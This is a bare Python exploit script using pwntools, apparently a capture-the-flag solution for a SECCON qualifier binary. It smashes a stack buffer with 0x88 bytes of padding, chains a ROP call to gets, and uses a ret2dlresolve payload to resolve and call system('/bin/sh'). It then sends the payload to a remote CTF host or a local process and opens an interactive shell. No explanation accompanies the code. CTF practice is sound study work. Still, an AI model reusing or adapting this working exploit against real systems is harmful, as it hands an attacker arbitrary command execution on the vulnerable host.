#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./chall')
dl = Ret2dlresolvePayload(binary, symbol='system', args=['/bin/sh'])

rop = ROP(binary)
rop.gets(dl.data_addr, len(dl.payload))
rop.ret2dlresolve(dl)

if args.REMOTE:
	p = remote('hiyoko.quals.seccon.jp', 9001)
else:
	p = process(binary.path)

context.log_level = 'debug'
payload  = b''
payload += 0x88 * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendline(payload)
p.interactive()